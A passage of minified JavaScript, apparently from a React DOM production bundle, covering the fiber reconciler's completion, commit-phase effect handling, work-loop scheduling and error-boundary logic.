n.flags&128?(n.lanes=t,n):(s=s!==null,s!==(e!==null&&e.memoizedState!==null)&&s&&(n.child.flags|=8192,n.mode&1&&(e===null||Q.current&1?ce===0&&(ce=3):Zl())),n.updateQueue!==null&&(n.flags|=4),ge(n),null);case 4:return Dt(),Va(e,n),e===null&&Es(n.stateNode.containerInfo),ge(n),null;case 10:return Il(n.type._context),ge(n),null;case 17:return Ce(n.type)&&Ur(),ge(n),null;case 19:if(X(Q),i=n.memoizedState,i===null)return ge(n),null;if(s=(n.flags&128)!==0,a=i.rendering,a===null)if(s)Zt(i,!1);else{if(ce!==0||e!==null&&e.flags&128)for(e=n.child;e!==null;){if(a=qr(e),a!==null){for(n.flags|=128,Zt(i,!1),s=a.updateQueue,s!==null&&(n.updateQueue=s,n.flags|=4),n.subtreeFlags=0,s=t,t=n.child;t!==null;)i=t,e=s,i.flags&=14680066,a=i.alternate,a===null?(i.childLanes=0,i.lanes=e,i.child=null,i.subtreeFlags=0,i.memoizedProps=null,i.memoizedState=null,i.updateQueue=null,i.dependencies=null,i.stateNode=null):(i.childLanes=a.childLanes,i.lanes=a.lanes,i.child=a.child,i.subtreeFlags=0,i.deletions=null,i.memoizedProps=a.memoizedProps,i.memoizedState=a.memoizedState,i.updateQueue=a.updateQueue,i.type=a.type,e=a.dependencies,i.dependencies=e===null?null:{lanes:e.lanes,firstContext:e.firstContext}),t=t.sibling;return Y(Q,Q.current&1|2),n.child}e=e.sibling}i.tail!==null&&ne()>jt&&(n.flags|=128,s=!0,Zt(i,!1),n.lanes=4194304)}else{if(!s)if(e=qr(a),e!==null){if(n.flags|=128,s=!0,t=e.updateQueue,t!==null&&(n.updateQueue=t,n.flags|=4),Zt(i,!0),i.tail===null&&i.tailMode==="hidden"&&!a.alternate&&!K)return ge(n),null}else 2*ne()-i.renderingStartTime>jt&&t!==1073741824&&(n.flags|=128,s=!0,Zt(i,!1),n.lanes=4194304);i.isBackwards?(a.sibling=n.child,n.child=a):(t=i.last,t!==null?t.sibling=a:n.child=a,i.last=a)}return i.tail!==null?(n=i.tail,i.rendering=n,i.tail=n.sibling,i.renderingStartTime=ne(),n.sibling=null,t=Q.current,Y(Q,s?t&1|2:t&1),n):(ge(n),null);case 22:case 23:return Ql(),s=n.memoizedState!==null,e!==null&&e.memoizedState!==null!==s&&(n.flags|=8192),s&&n.mode&1?Ae&1073741824&&(ge(n),n.subtreeFlags&6&&(n.flags|=8192)):ge(n),null;case 24:return null;case 25:return null}throw Error(P(156,n.tag))}function om(e,n){switch(Nl(n),n.tag){case 1:return Ce(n.type)&&Ur(),e=n.flags,e&65536?(n.flags=e&-65537|128,n):null;case 3:return Dt(),X(Te),X(ve),Fl(),e=n.flags,e&65536&&!(e&128)?(n.flags=e&-65537|128,n):null;case 5:return Bl(n),null;case 13:if(X(Q),e=n.memoizedState,e!==null&&e.dehydrated!==null){if(n.alternate===null)throw Error(P(340));Mt()}return e=n.flags,e&65536?(n.flags=e&-65537|128,n):null;case 19:return X(Q),null;case 4:return Dt(),null;case 10:return Il(n.type._context),null;case 22:case 23:return Ql(),null;case 24:return null;default:return null}}var cr=!1,ye=!1,cm=typeof WeakSet=="function"?WeakSet:Set,z=null;function bt(e,n){var t=e.ref;if(t!==null)if(typeof t=="function")try{t(null)}catch(s){ee(e,n,s)}else t.current=null}function Wa(e,n,t){try{t()}catch(s){ee(e,n,s)}}var mc=!1;function um(e,n){if(Ca=zr,e=np(),Al(e)){if("selectionStart"in e)var t={start:e.selectionStart,end:e.selectionEnd};else e:{t=(t=e.ownerDocument)&&t.defaultView||window;var s=t.getSelection&&t.getSelection();if(s&&s.rangeCount!==0){t=s.anchorNode;var r=s.anchorOffset,i=s.focusNode;s=s.focusOffset;try{t.nodeType,i.nodeType}catch{t=null;break e}var a=0,l=-1,o=-1,c=0,u=0,d=e,h=null;n:for(;;){for(var v;d!==t||r!==0&&d.nodeType!==3||(l=a+r),d!==i||s!==0&&d.nodeType!==3||(o=a+s),d.nodeType===3&&(a+=d.nodeValue.length),(v=d.firstChild)!==null;)h=d,d=v;for(;;){if(d===e)break n;if(h===t&&++c===r&&(l=a),h===i&&++u===s&&(o=a),(v=d.nextSibling)!==null)break;d=h,h=d.parentNode}d=v}t=l===-1||o===-1?null:{start:l,end:o}}else t=null}t=t||{start:0,end:0}}else t=null;for(Pa={focusedElem:e,selectionRange:t},zr=!1,z=n;z!==null;)if(n=z,e=n.child,(n.subtreeFlags&1028)!==0&&e!==null)e.return=n,z=e;else for(;z!==null;){n=z;try{var k=n.alternate;if(n.flags&1024)switch(n.tag){case 0:case 11:case 15:break;case 1:if(k!==null){var x=k.memoizedProps,A=k.memoizedState,p=n.stateNode,f=p.getSnapshotBeforeUpdate(n.elementType===n.type?x:We(n.type,x),A);p.__reactInternalSnapshotBeforeUpdate=f}break;case 3:var m=n.stateNode.containerInfo;m.nodeType===1?m.textContent="":m.nodeType===9&&m.documentElement&&m.removeChild(m.documentElement);break;case 5:case 6:case 4:case 17:break;default:throw Error(P(163))}}catch(S){ee(n,n.return,S)}if(e=n.sibling,e!==null){e.return=n.return,z=e;break}z=n.return}return k=mc,mc=!1,k}function fs(e,n,t){var s=n.updateQueue;if(s=s!==null?s.lastEffect:null,s!==null){var r=s=s.next;do{if((r.tag&e)===e){var i=r.destroy;r.destroy=void 0,i!==void 0&&Wa(n,t,i)}r=r.next}while(r!==s)}}function vi(e,n){if(n=n.updateQueue,n=n!==null?n.lastEffect:null,n!==null){var t=n=n.next;do{if((t.tag&e)===e){var s=t.create;t.destroy=s()}t=t.next}while(t!==n)}}function $a(e){var n=e.ref;if(n!==null){var t=e.stateNode;switch(e.tag){case 5:e=t;break;default:e=t}typeof n=="function"?n(e):n.current=e}}function Qp(e){var n=e.alternate;n!==null&&(e.alternate=null,Qp(n)),e.child=null,e.deletions=null,e.sibling=null,e.tag===5&&(n=e.stateNode,n!==null&&(delete n[en],delete n[Cs],delete n[Na],delete n[Gf],delete n[Yf])),e.stateNode=null,e.return=null,e.dependencies=null,e.memoizedProps=null,e.memoizedState=null,e.pendingProps=null,e.stateNode=null,e.updateQueue=null}function Zp(e){return e.tag===5||e.tag===3||e.tag===4}function gc(e){e:for(;;){for(;e.sibling===null;){if(e.return===null||Zp(e.return))return null;e=e.return}for(e.sibling.return=e.return,e=e.sibling;e.tag!==5&&e.tag!==6&&e.tag!==18;){if(e.flags&2||e.child===null||e.tag===4)continue e;e.child.return=e,e=e.child}if(!(e.flags&2))return e.stateNode}}function Ga(e,n,t){var s=e.tag;if(s===5||s===6)e=e.stateNode,n?t.nodeType===8?t.parentNode.insertBefore(e,n):t.insertBefore(e,n):(t.nodeType===8?(n=t.parentNode,n.insertBefore(e,t)):(n=t,n.appendChild(e)),t=t._reactRootContainer,t!=null||n.onclick!==null||(n.onclick=Fr));else if(s!==4&&(e=e.child,e!==null))for(Ga(e,n,t),e=e.sibling;e!==null;)Ga(e,n,t),e=e.sibling}function Ya(e,n,t){var s=e.tag;if(s===5||s===6)e=e.stateNode,n?t.insertBefore(e,n):t.appendChild(e);else if(s!==4&&(e=e.child,e!==null))for(Ya(e,n,t),e=e.sibling;e!==null;)Ya(e,n,t),e=e.sibling}var de=null,$e=!1;function wn(e,n,t){for(t=t.child;t!==null;)Jp(e,n,t),t=t.sibling}function Jp(e,n,t){if(nn&&typeof nn.onCommitFiberUnmount=="function")try{nn.onCommitFiberUnmount(ui,t)}catch{}switch(t.tag){case 5:ye||bt(t,n);case 6:var s=de,r=$e;de=null,wn(e,n,t),de=s,$e=r,de!==null&&($e?(e=de,t=t.stateNode,e.nodeType===8?e.parentNode.removeChild(t):e.removeChild(t)):de.removeChild(t.stateNode));break;case 18:de!==null&&($e?(e=de,t=t.stateNode,e.nodeType===8?Gi(e.parentNode,t):e.nodeType===1&&Gi(e,t),xs(e)):Gi(de,t.stateNode));break;case 4:s=de,r=$e,de=t.stateNode.containerInfo,$e=!0,wn(e,n,t),de=s,$e=r;break;case 0:case 11:case 14:case 15:if(!ye&&(s=t.updateQueue,s!==null&&(s=s.lastEffect,s!==null))){r=s=s.next;do{var i=r,a=i.destroy;i=i.tag,a!==void 0&&(i&2||i&4)&&Wa(t,n,a),r=r.next}while(r!==s)}wn(e,n,t);break;case 1:if(!ye&&(bt(t,n),s=t.stateNode,typeof s.componentWillUnmount=="function"))try{s.props=t.memoizedProps,s.state=t.memoizedState,s.componentWillUnmount()}catch(l){ee(t,n,l)}wn(e,n,t);break;case 21:wn(e,n,t);break;case 22:t.mode&1?(ye=(s=ye)||t.memoizedState!==null,wn(e,n,t),ye=s):wn(e,n,t);break;default:wn(e,n,t)}}function yc(e){var n=e.updateQueue;if(n!==null){e.updateQueue=null;var t=e.stateNode;t===null&&(t=e.stateNode=new cm),n.forEach(function(s){var r=wm.bind(null,e,s);t.has(s)||(t.add(s),s.then(r,r))})}}function Ve(e,n){var t=n.deletions;if(t!==null)for(var s=0;s<t.length;s++){var r=t[s];try{var i=e,a=n,l=a;e:for(;l!==null;){switch(l.tag){case 5:de=l.stateNode,$e=!1;break e;case 3:de=l.stateNode.containerInfo,$e=!0;break e;case 4:de=l.stateNode.containerInfo,$e=!0;break e}l=l.return}if(de===null)throw Error(P(160));Jp(i,a,r),de=null,$e=!1;var o=r.alternate;o!==null&&(o.return=null),r.return=null}catch(c){ee(r,n,c)}}if(n.subtreeFlags&12854)for(n=n.child;n!==null;)ed(n,e),n=n.sibling}function ed(e,n){var t=e.alternate,s=e.flags;switch(e.tag){case 0:case 11:case 14:case 15:if(Ve(n,e),Ze(e),s&4){try{fs(3,e,e.return),vi(3,e)}catch(x){ee(e,e.return,x)}try{fs(5,e,e.return)}catch(x){ee(e,e.return,x)}}break;case 1:Ve(n,e),Ze(e),s&512&&t!==null&&bt(t,t.return);break;case 5:if(Ve(n,e),Ze(e),s&512&&t!==null&&bt(t,t.return),e.flags&32){var r=e.stateNode;try{vs(r,"")}catch(x){ee(e,e.return,x)}}if(s&4&&(r=e.stateNode,r!=null)){var i=e.memoizedProps,a=t!==null?t.memoizedProps:i,l=e.type,o=e.updateQueue;if(e.updateQueue=null,o!==null)try{l==="input"&&i.type==="radio"&&i.name!=null&&xu(r,i),ya(l,a);var c=ya(l,i);for(a=0;a<o.length;a+=2){var u=o[a],d=o[a+1];u==="style"?Cu(r,d):u==="dangerouslySetInnerHTML"?Eu(r,d):u==="children"?vs(r,d):gl(r,u,d,c)}switch(l){case"input":da(r,i);break;case"textarea":Su(r,i);break;case"select":var h=r._wrapperState.wasMultiple;r._wrapperState.wasMultiple=!!i.multiple;var v=i.value;v!=null?_t(r,!!i.multiple,v,!1):h!==!!i.multiple&&(i.defaultValue!=null?_t(r,!!i.multiple,i.defaultValue,!0):_t(r,!!i.multiple,i.multiple?[]:"",!1))}r[Cs]=i}catch(x){ee(e,e.return,x)}}break;case 6:if(Ve(n,e),Ze(e),s&4){if(e.stateNode===null)throw Error(P(162));r=e.stateNode,i=e.memoizedProps;try{r.nodeValue=i}catch(x){ee(e,e.return,x)}}break;case 3:if(Ve(n,e),Ze(e),s&4&&t!==null&&t.memoizedState.isDehydrated)try{xs(n.containerInfo)}catch(x){ee(e,e.return,x)}break;case 4:Ve(n,e),Ze(e);break;case 13:Ve(n,e),Ze(e),r=e.child,r.flags&8192&&(i=r.memoizedState!==null,r.stateNode.isHidden=i,!i||r.alternate!==null&&r.alternate.memoizedState!==null||(Xl=ne())),s&4&&yc(e);break;case 22:if(u=t!==null&&t.memoizedState!==null,e.mode&1?(ye=(c=ye)||u,Ve(n,e),ye=c):Ve(n,e),Ze(e),s&8192){if(c=e.memoizedState!==null,(e.stateNode.isHidden=c)&&!u&&e.mode&1)for(z=e,u=e.child;u!==null;){for(d=z=u;z!==null;){switch(h=z,v=h.child,h.tag){case 0:case 11:case 14:case 15:fs(4,h,h.return);break;case 1:bt(h,h.return);var k=h.stateNode;if(typeof k.componentWillUnmount=="function"){s=h,t=h.return;try{n=s,k.props=n.memoizedProps,k.state=n.memoizedState,k.componentWillUnmount()}catch(x){ee(s,t,x)}}break;case 5:bt(h,h.return);break;case 22:if(h.memoizedState!==null){wc(d);continue}}v!==null?(v.return=h,z=v):wc(d)}u=u.sibling}e:for(u=null,d=e;;){if(d.tag===5){if(u===null){u=d;try{r=d.stateNode,c?(i=r.style,typeof i.setProperty=="function"?i.setProperty("display","none","important"):i.display="none"):(l=d.stateNode,o=d.memoizedProps.style,a=o!=null&&o.hasOwnProperty("display")?o.display:null,l.style.display=Tu("display",a))}catch(x){ee(e,e.return,x)}}}else if(d.tag===6){if(u===null)try{d.stateNode.nodeValue=c?"":d.memoizedProps}catch(x){ee(e,e.return,x)}}else if((d.tag!==22&&d.tag!==23||d.memoizedState===null||d===e)&&d.child!==null){d.child.return=d,d=d.child;continue}if(d===e)break e;for(;d.sibling===null;){if(d.return===null||d.return===e)break e;u===d&&(u=null),d=d.return}u===d&&(u=null),d.sibling.return=d.return,d=d.sibling}}break;case 19:Ve(n,e),Ze(e),s&4&&yc(e);break;case 21:break;default:Ve(n,e),Ze(e)}}function Ze(e){var n=e.flags;if(n&2){try{e:{for(var t=e.return;t!==null;){if(Zp(t)){var s=t;break e}t=t.return}throw Error(P(160))}switch(s.tag){case 5:var r=s.stateNode;s.flags&32&&(vs(r,""),s.flags&=-33);var i=gc(e);Ya(e,i,r);break;case 3:case 4:var a=s.stateNode.containerInfo,l=gc(e);Ga(e,l,a);break;default:throw Error(P(161))}}catch(o){ee(e,e.return,o)}e.flags&=-3}n&4096&&(e.flags&=-4097)}function pm(e,n,t){z=e,nd(e)}function nd(e,n,t){for(var s=(e.mode&1)!==0;z!==null;){var r=z,i=r.child;if(r.tag===22&&s){var a=r.memoizedState!==null||cr;if(!a){var l=r.alternate,o=l!==null&&l.memoizedState!==null||ye;l=cr;var c=ye;if(cr=a,(ye=o)&&!c)for(z=r;z!==null;)a=z,o=a.child,a.tag===22&&a.memoizedState!==null?kc(r):o!==null?(o.return=a,z=o):kc(r);for(;i!==null;)z=i,nd(i),i=i.sibling;z=r,cr=l,ye=c}vc(e)}else r.subtreeFlags&8772&&i!==null?(i.return=r,z=i):vc(e)}}function vc(e){for(;z!==null;){var n=z;if(n.flags&8772){var t=n.alternate;try{if(n.flags&8772)switch(n.tag){case 0:case 11:case 15:ye||vi(5,n);break;case 1:var s=n.stateNode;if(n.flags&4&&!ye)if(t===null)s.componentDidMount();else{var r=n.elementType===n.type?t.memoizedProps:We(n.type,t.memoizedProps);s.componentDidUpdate(r,t.memoizedState,s.__reactInternalSnapshotBeforeUpdate)}var i=n.updateQueue;i!==null&&tc(n,i,s);break;case 3:var a=n.updateQueue;if(a!==null){if(t=null,n.child!==null)switch(n.child.tag){case 5:t=n.child.stateNode;break;case 1:t=n.child.stateNode}tc(n,a,t)}break;case 5:var l=n.stateNode;if(t===null&&n.flags&4){t=l;var o=n.memoizedProps;switch(n.type){case"button":case"input":case"select":case"textarea":o.autoFocus&&t.focus();break;case"img":o.src&&(t.src=o.src)}}break;case 6:break;case 4:break;case 12:break;case 13:if(n.memoizedState===null){var c=n.alternate;if(c!==null){var u=c.memoizedState;if(u!==null){var d=u.dehydrated;d!==null&&xs(d)}}}break;case 19:case 17:case 21:case 22:case 23:case 25:break;default:throw Error(P(163))}ye||n.flags&512&&$a(n)}catch(h){ee(n,n.return,h)}}if(n===e){z=null;break}if(t=n.sibling,t!==null){t.return=n.return,z=t;break}z=n.return}}function wc(e){for(;z!==null;){var n=z;if(n===e){z=null;break}var t=n.sibling;if(t!==null){t.return=n.return,z=t;break}z=n.return}}function kc(e){for(;z!==null;){var n=z;try{switch(n.tag){case 0:case 11:case 15:var t=n.return;try{vi(4,n)}catch(o){ee(n,t,o)}break;case 1:var s=n.stateNode;if(typeof s.componentDidMount=="function"){var r=n.return;try{s.componentDidMount()}catch(o){ee(n,r,o)}}var i=n.return;try{$a(n)}catch(o){ee(n,i,o)}break;case 5:var a=n.return;try{$a(n)}catch(o){ee(n,a,o)}}}catch(o){ee(n,n.return,o)}if(n===e){z=null;break}var l=n.sibling;if(l!==null){l.return=n.return,z=l;break}z=n.return}}var dm=Math.ceil,Qr=vn.ReactCurrentDispatcher,Yl=vn.ReactCurrentOwner,Be=vn.ReactCurrentBatchConfig,V=0,pe=null,se=null,he=0,Ae=0,xt=Hn(0),ce=0,Os=null,rt=0,wi=0,ql=0,ms=null,Se=null,Xl=0,jt=1/0,ln=null,Zr=!1,qa=null,In=null,ur=!1,Pn=null,Jr=0,gs=0,Xa=null,Er=-1,Tr=0;function ke(){return V&6?ne():Er!==-1?Er:Er=ne()}function Dn(e){return e.mode&1?V&2&&he!==0?he&-he:Xf.transition!==null?(Tr===0&&(Tr=Bu()),Tr):(e=G,e!==0||(e=window.event,e=e===void 0?16:Gu(e.type)),e):1}function Xe(e,n,t,s){if(50<gs)throw gs=0,Xa=null,Error(P(185));Us(e,t,s),(!(V&2)||e!==pe)&&(e===pe&&(!(V&2)&&(wi|=t),ce===4&&En(e,he)),Pe(e,s),t===1&&V===0&&!(n.mode&1)&&(jt=ne()+500,mi&&Vn()))}function Pe(e,n){var t=e.callbackNode;qh(e,n);var s=Dr(e,e===pe?he:0);if(s===0)t!==null&&Ao(t),e.callbackNode=null,e.callbackPriority=0;else if(n=s&-s,e.callbackPriority!==n){if(t!=null&&Ao(t),n===1)e.tag===0?qf(bc.bind(null,e)):pp(bc.bind(null,e)),Wf(function(){!(V&6)&&Vn()}),t=null;else{switch(Fu(s)){case 1:t=bl;break;case 4:t=zu;break;case 16:t=Ir;break;case 536870912:t=ju;break;default:t=Ir}t=cd(t,td.bind(null,e))}e.callbackPriority=n,e.callbackNode=t}}function td(e,n){if(Er=-1,Tr=0,V&6)throw Error(P(327));var t=e.callbackNode;if(At()&&e.callbackNode!==t)return null;var s=Dr(e,e===pe?he:0);if(s===0)return null;if(s&30||s&e.expiredLanes||n)n=ei(e,s);else{n=s;var r=V;V|=2;var i=rd();(pe!==e||he!==n)&&(ln=null,jt=ne()+500,Zn(e,n));do try{mm();break}catch(l){sd(e,l)}while(!0);Ml(),Qr.current=i,V=r,se!==null?n=0:(pe=null,he=0,n=ce)}if(n!==0){if(n===2&&(r=xa(e),r!==0&&(s=r,n=Ka(e,r))),n===1)throw t=Os,Zn(e,0),En(e,s),Pe(e,ne()),t;if(n===6)En(e,s);else{if(r=e.current.alternate,!(s&30)&&!hm(r)&&(n=ei(e,s),n===2&&(i=xa(e),i!==0&&(s=i,n=Ka(e,i))),n===1))throw t=Os,Zn(e,0),En(e,s),Pe(e,ne()),t;switch(e.finishedWork=r,e.finishedLanes=s,n){case 0:case 1:throw Error(P(345));case 2:Yn(e,Se,ln);break;case 3:if(En(e,s),(s&130023424)===s&&(n=Xl+500-ne(),10<n)){if(Dr(e,0)!==0)break;if(r=e.suspendedLanes,(r&s)!==s){ke(),e.pingedLanes|=e.suspendedLanes&r;break}e.timeoutHandle=La(Yn.bind(null,e,Se,ln),n);break}Yn(e,Se,ln);break;case 4:if(En(e,s),(s&4194240)===s)break;for(n=e.eventTimes,r=-1;0<s;){var a=31-qe(s);i=1<<a,a=n[a],a>r&&(r=a),s&=~i}if(s=r,s=ne()-s,s=(120>s?120:480>s?480:1080>s?1080:1920>s?1920:3e3>s?3e3:4320>s?4320:1960*dm(s/1960))-s,10<s){e.timeoutHandle=La(Yn.bind(null,e,Se,ln),s);break}Yn(e,Se,ln);break;case 5:Yn(e,Se,ln);break;default:throw Error(P(329))}}}return Pe(e,ne()),e.callbackNode===t?td.bind(null,e):null}function Ka(e,n){var t=ms;return e.current.memoizedState.isDehydrated&&(Zn(e,n).flags|=256),e=ei(e,n),e!==2&&(n=Se,Se=t,n!==null&&Qa(n)),e}function Qa(e){Se===null?Se=e:Se.push.apply(Se,e)}function hm(e){for(var n=e;;){if(n.flags&16384){var t=n.updateQueue;if(t!==null&&(t=t.stores,t!==null))for(var s=0;s<t.length;s++){var r=t[s],i=r.getSnapshot;r=r.value;try{if(!Ke(i(),r))return!1}catch{return!1}}}if(t=n.child,n.subtreeFlags&16384&&t!==null)t.return=n,n=t;else{if(n===e)break;for(;n.sibling===null;){if(n.return===null||n.return===e)return!0;n=n.return}n.sibling.return=n.return,n=n.sibling}}return!0}function En(e,n){for(n&=~ql,n&=~wi,e.suspendedLanes|=n,e.pingedLanes&=~n,e=e.expirationTimes;0<n;){var t=31-qe(n),s=1<<t;e[t]=-1,n&=~s}}function bc(e){if(V&6)throw Error(P(327));At();var n=Dr(e,0);if(!(n&1))return Pe(e,ne()),null;var t=ei(e,n);if(e.tag!==0&&t===2){var s=xa(e);s!==0&&(n=s,t=Ka(e,s))}if(t===1)throw t=Os,Zn(e,0),En(e,n),Pe(e,ne()),t;if(t===6)throw Error(P(345));return e.finishedWork=e.current.alternate,e.finishedLanes=n,Yn(e,Se,ln),Pe(e,ne()),null}function Kl(e,n){var t=V;V|=1;try{return e(n)}finally{V=t,V===0&&(jt=ne()+500,mi&&Vn())}}function it(e){Pn!==null&&Pn.tag===0&&!(V&6)&&At();var n=V;V|=1;var t=Be.transition,s=G;try{if(Be.transition=null,G=1,e)return e()}finally{G=s,Be.transition=t,V=n,!(V&6)&&Vn()}}function Ql(){Ae=xt.current,X(xt)}function Zn(e,n){e.finishedWork=null,e.finishedLanes=0;var t=e.timeoutHandle;if(t!==-1&&(e.timeoutHandle=-1,Vf(t)),se!==null)for(t=se.return;t!==null;){var s=t;switch(Nl(s),s.tag){case 1:s=s.type.childContextTypes,s!=null&&Ur();break;case 3:Dt(),X(Te),X(ve),Fl();break;case 5:Bl(s);break;case 4:Dt();break;case 13:X(Q);break;case 19:X(Q);break;case 10:Il(s.type._context);break;case 22:case 23:Ql()}t=t.return}if(pe=e,se=e=zn(e.current,null),he=Ae=n,ce=0,Os=null,ql=wi=rt=0,Se=ms=null,Xn!==null){for(n=0;n<Xn.length;n++)if(t=Xn[n],s=t.interleaved,s!==null){t.interleaved=null;var r=s.next,i=t.pending;if(i!==null){var a=i.next;i.next=r,s.next=a}t.pending=s}Xn=null}return e}function sd(e,n){do{var t=se;try{if(Ml(),xr.current=Kr,Xr){for(var s=Z.memoizedState;s!==null;){var r=s.queue;r!==null&&(r.pending=null),s=s.next}Xr=!1}if(st=0,ue=oe=Z=null,hs=!1,Ls=0,Yl.current=null,t===null||t.return===null){ce=1,Os=n,se=null;break}e:{var i=e,a=t.return,l=t,o=n;if(n=he,l.flags|=32768,o!==null&&typeof o=="object"&&typeof o.then=="function"){var c=o,u=l,d=u.tag;if(!(u.mode&1)&&(d===0||d===11||d===15)){var h=u.alternate;h?(u.updateQueue=h.updateQueue,u.memoizedState=h.memoizedState,u.lanes=h.lanes):(u.updateQueue=null,u.memoizedState=null)}var v=oc(a);if(v!==null){v.flags&=-257,cc(v,a,l,i,n),v.mode&1&&lc(i,c,n),n=v,o=c;var k=n.updateQueue;if(k===null){var x=new Set;x.add(o),n.updateQueue=x}else k.add(o);break e}else{if(!(n&1)){lc(i,c,n),Zl();break e}o=Error(P(426))}}else if(K&&l.mode&1){var A=oc(a);if(A!==null){!(A.flags&65536)&&(A.flags|=256),cc(A,a,l,i,n),Rl(zt(o,l));break e}}i=o=zt(o,l),ce!==4&&(ce=2),ms===null?ms=[i]:ms.push(i),i=a;do{switch(i.tag){case 3:i.flags|=65536,n&=-n,i.lanes|=n;var p=Fp(i,o,n);nc(i,p);break e;case 1:l=o;var f=i.type,m=i.stateNode;if(!(i.flags&128)&&(typeof f.getDerivedStateFromError=="function"||m!==null&&typeof m.componentDidCatch=="function"&&(In===null||!In.has(m)))){i.flags|=65536,n&=-n,i.lanes|=n;var S=Up(i,l,n);nc(i,S);break e}}i=i.return}while(i!==null)}ad(t)}catch(T){n=T,se===t&&t!==null&&(se=t=t.return);continue}break}while(!0)}function rd(){var e=Qr.current;return Qr.current=Kr,e===null?Kr:e}function Zl(){(ce===0||ce===3||ce===2)&&(ce=4),pe===null||!(rt&268435455)&&!(wi&268435455)||En(pe,he)}function ei(e,n){var t=V;V|=2;var s=rd();(pe!==e||he!==n)&&(ln=null,Zn(e,n));do try{fm();break}catch(r){sd(e,r)}while(!0);if(Ml(),V=t,Qr.current=s,se!==null)throw Error(P(261));return pe=null,he=0,ce}function fm(){for(;se!==null;)id(se)}function mm(){for(;se!==null&&!Bh();)id(se)}function id(e){var n=od(e.alternate,e,Ae);e.memoizedProps=e.pendingProps,n===null?ad(e):se=n,Yl.current=null}function ad(e){var n=e;do{var t=n.alternate;if(e=n.return,n.flags&32768){if(t=om(t,n),t!==null){t.flags&=32767,se=t;return}if(e!==null)e.flags|=32768,e.subtreeFlags=0,e.deletions=null;else{ce=6,se=null;return}}else if(t=lm(t,n,Ae),t!==null){se=t;return}if(n=n.sibling,n!==null){se=n;return}se=n=e}while(n!==null);ce===0&&(ce=5)}function Yn(e,n,t){var s=G,r=Be.transition;try{Be.transition=null,G=1,gm(e,n,t,s)}finally{Be.transition=r,G=s}return null}function gm(e,n,t,s){do At();while(Pn!==null);if(V&6)throw Error(P(327));t=e.finishedWork;var r=e.finishedLanes;if(t===null)return null;if(e.finishedWork=null,e.finishedLanes=0,t===e.current)throw Error(P(177));e.callbackNode=null,e.callbackPriority=0;var i=t.lanes|t.childLanes;if(Xh(e,i),e===pe&&(se=pe=null,he=0),!(t.subtreeFlags&2064)&&!(t.flags&2064)||ur||(ur=!0,cd(Ir,function(){return At(),null})),i=(t.flags&15990)!==0,t.subtreeFlags&15990||i){i=Be.transition,Be.transition=null;var a=G;G=1;var l=V;V|=4,Yl.current=null,um(e,t),ed(t,e),Df(Pa),zr=!!Ca,Pa=Ca=null,e.current=t,pm(t),Fh(),V=l,G=a,Be.transition=i}else e.current=t;if(ur&&(ur=!1,Pn=e,Jr=r),i=e.pendingLanes,i===0&&(In=null),Vh(t.stateNode),Pe(e,ne()),n!==null)for(s=e.onRecoverableError,t=0;t<n.length;t++)r=n[t],s(r.value,{componentStack:r.stack,digest:r.digest});if(Zr)throw Zr=!1,e=qa,qa=null,e;return Jr&1&&e.tag!==0&&At(),i=e.pendingLanes,i&1?e===Xa?gs++:(gs=0,Xa=e):gs=0,Vn(),null}function At(){if(Pn!==null){var e=Fu(Jr),n=Be.transition,t=G;try{if(Be.transition=null,G=16>e?16:e,Pn===null)var s=!1;else{if(e=Pn,Pn=null,Jr=0,V&6)throw Error(P(331));var r=V;for(V|=4,z=e.current;z!==null;){var i=z,a=i.child;if(z.flags&16){var l=i.deletions;if(l!==null){for(var o=0;o<l.length;o++){var c=l[o];for(z=c;z!==null;){var u=z;switch(u.tag){case 0:case 11:case 15:fs(8,u,i)}var d=u.child;if(d!==null)d.return=u,z=d;else for(;z!==null;){u=z;var h=u.sibling,v=u.return;if(Qp(u),u===c){z=null;break}if(h!==null){h.return=v,z=h;break}z=v}}}var k=i.alternate;if(k!==null){var x=k.child;if(x!==null){k.child=null;do{var A=x.sibling;x.sibling=null,x=A}while(x!==null)}}z=i}}if(i.subtreeFlags&2064&&a!==null)a.return=i,z=a;else e:for(;z!==null;){if(i=z,i.flags&2048)switch(i.tag){case 0:case 11:case 15:fs(9,i,i.return)}var p=i.sibling;if(p!==null){p.return=i.return,z=p;break e}z=i.return}}var f=e.current;for(z=f;z!==null;){a=z;var m=a.child;if(a.subtreeFlags&2064&&m!==null)m.return=a,z=m;else e:for(a=f;z!==null;){if(l=z,l.flags&2048)try{switch(l.tag){case 0:case 11:case 15:vi(9,l)}}catch(T){ee(l,l.return,T)}if(l===a){z=null;break e}var S=l.sibling;if(S!==null){S.return=l.return,z=S;break e}z=l.return}}if(V=r,Vn(),nn&&typeof nn.onPostCommitFiberRoot=="function")try{nn.onPostCommitFiberRoot(ui,e)}catch{}s=!0}return s}finally{G=t,Be.transition=n}}return!1}function xc(e,n,t){n=zt(t,n),n=Fp(e,n,1),e=Mn(e,n,1),n=ke(),e!==null&&(Us(e,1,n),Pe(e,n))}function ee(e,n,t){if(e.tag===3)xc(e,e,t);else for(;n!==null;){if(n.tag===3){xc(n,e,t);break}else if(n.tag===1){var s=n.stateNode;if(typeof n.type.getDerivedStateFromError=="function"||typeof s.componentDidCatch=="function"&&(In===null||!In.has(s))){e=zt(t,e),e=Up(n,e,1),n=Mn(n,e,1),e=ke(),n!==null&&(Us(n,1,e),Pe(n,e));break}}n=n.return}}function ym(e,n,t){var s=e.pingCache;s!==null&&s.delete(n),n=ke(),e.pingedLanes|=e.suspendedLanes&t,pe===e&&(he&t)===t&&(ce===4||ce===3&&(he&130023424)===he&&500>ne()-Xl?Zn(e,0):ql|=t),Pe(e,n)}function ld(e,n){n===0&&(e.mode&1?(n=er,er<<=1,!(er&130023424)&&(er=4194304)):n=1);var t=ke();e=mn(e,n),e!==null&&(Us(e,n,t),Pe(e,t))}function vm(e){var n=e.memoizedState,t=0;n!==null&&(t=n.retryLane),ld(e,t)}function wm(e,n){var t=0;switch(e.tag){case 13:var s=e.stateNode,r=e.memoizedState;r!==null&&(t=r.retryLane);break;case 19:s=e.stateNode;break;default:throw Error(P(314))}s!==null&&s.delete(n),ld(e,t)}var od;od=function(e,n,t){if(e!==null)if(e.memoizedProps!==n.pendingProps||Te.current)_e=!0;else{if(!(e.lanes&t)&&!(n.flags&128))return _e=!1,am(e,n,t);_e=!!(e.flags&131072)}else _e=!1,K&&n.flags&1048576&&dp(n,Wr,n.index);switch(n.lanes=0,n.tag){case 2:var s=n.type;_r(e,n),e=n.pendingProps;var r=Ot(n,ve.current);Pt(n,t),r=Hl(null,n,s,e,r,t);var i=Vl();return n.flags|=1,typeof r=="object"&&r!==null&&typeof r.render=="function"&&r.$$typeof===void 